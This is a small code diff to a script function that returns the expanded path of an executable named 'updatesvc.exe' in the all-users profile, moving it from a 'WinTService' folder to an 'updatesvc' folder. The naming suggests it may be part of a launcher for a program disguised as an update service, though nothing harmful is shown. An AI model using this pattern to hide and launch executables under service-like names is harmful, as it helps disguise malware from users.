@@ -5,7 +5,7 @@ function LnchInTime() {}
 
 function LnchInTime.GetExePath()
 {
-	var strExePath = "%allusersprofile%\\WinTService\\updatesvc.exe"
+	var strExePath = "%allusersprofile%\\updatesvc\\updatesvc.exe"
 	var strPathWithFix = __storage.ExpandEnvironmentStrings(strExePath)
 	return strPathWithFix
 }
